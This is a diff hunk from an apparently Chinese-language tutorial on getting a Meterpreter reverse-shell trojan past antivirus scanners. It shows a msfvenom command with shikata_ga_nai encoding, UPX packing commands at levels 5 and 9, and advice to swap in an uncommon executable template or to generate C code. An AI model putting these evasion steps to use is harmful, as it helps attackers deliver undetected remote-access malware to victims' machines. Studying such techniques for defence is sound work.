@@ -54,7 +54,8 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shika
 发现更换可执行文件模板的马儿依然被查杀，编码和更换模板都行不通，可以试试 **加壳**。软件加壳基本原理就是对可执行文件进行加密压缩，执行之后将代码解压为原始程序，这里分别使用5、9级别upx加壳等级对木马进行加壳
 
 <pre class="language-bash"><code class="lang-bash"><strong>upx -5 shell.exe -o upx5_shell.exe
-</strong>upx -9 shell.exe -o upx9_shell.exe</code></pre>
+</strong>upx -9 shell.exe -o upx9_shell.exe
+</code></pre>
 
 将木马藏在可执行文件里面，文件的md5值会发生改变，杀毒软件将文件与官方原版文件进行对比即可判断是否异常，这里 **换一个不常见的可执行文件模板（可以是自己写的）**\
 还有可以不直接生成可执行文件，而是 **生成c代码**
